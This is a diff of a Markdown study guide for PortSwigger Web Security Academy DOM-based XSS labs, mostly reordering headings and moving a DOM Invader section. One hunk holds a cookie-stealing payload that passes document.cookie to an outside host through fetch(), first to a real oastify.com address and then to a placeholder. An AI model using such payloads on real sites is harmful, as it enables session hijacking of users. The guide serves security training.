@@ -75,15 +75,15 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ## DOM-Based XSS  
 
-[Identify DOM-XSS](#identify-dom-xss)  
-[Vulnerable AngularJS](#vuln-angularjs)  
-[Document Write Location search](#doc-write-location-search)  
-[Dom Invader](#dom-invader)  
+[DOM XSS Indicators](#identify-dom-xss)  
+[DOM XSS Identified with DOM Invader](#dom-invader)  
+[DOM XSS AngularJS](#vuln-angularjs)  
+[DOM XSS document.write in select](#doc-write-location-search)  
 [DOM XSS JSON.parse web messages](#dom-xss-jsonparse-web-messages)  
 [DOM XSS AddEventListener JavaScript URL](#dom-xss-addeventlistener-javascript-url)  
 [DOM XSS AddEventListener Ads Message](#dom-xss-addeventlistener-ads-message)  
-[Reflected DOM-XSS Cookie Stealer](#reflected-dom-xss)  
-[DOM-XSS LastviewedProduct Cookie](#dom-xss-lastviewedproduct-cookie)  
+[DOM XSS Eval Reflected Cookie Stealer](#reflected-dom-xss)  
+[DOM XSS LastviewedProduct Cookie](#dom-xss-lastviewedproduct-cookie)  
 
 ### Identify DOM-XSS  
 
@@ -117,6 +117,12 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 * location.search
 * addEventListener  
   
+### Dom Invader  
+
+>Using Dom Invader plug-in and set the canary to value, such as `domxss`, it will detect DOM-XSS sinks that can be exploit.  
+
+![DOM Invader](images/dom-invader.png)  
+
 ### Vuln AngularJS  
   
 >AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script included. Review the HTML code to ***identify*** the ```ng-app``` directive telling AngularJS that this is the root element of the AngularJS application.  
@@ -166,13 +172,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ![dom-xss](images/dom-xss.png)  
 
 [PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  
-
-### Dom Invader  
-
->Using Dom Invader plug-in and set the canary to value, such as ```domxss```, it will detect DOM-XSS sinks that can be exploit.  
-
-![DOM Invader](images/dom-invader.png)  
-
+  
 ### DOM XSS JSON.parse web messages    
 
 >Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  
@@ -291,7 +291,7 @@ From the Site Map, open the `searchResults.js` file and notice that the JSON res
 >Above payload validate that the backslash **\\** is not sanitized, and the JSON data is then send to `eval()`.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively **cancelled out**.  
 
 ```JavaScript
-\"-fetch('https://xij89yfbz2bycflmxjmfdohokfq6ew2l.oastify.com?reflects='+document.cookie)}//
+\"-fetch('https://COLLABORATOR.com?reflects='+document.cookie)}//
 ```  
 
 >The above payload every character is URL encoded and used as the search parameter value. Then because this lab do not have an exploit server I host my own `python3 -m http.server 80` web service and save the `index.html` contain the location target url between `<script>` tags. 
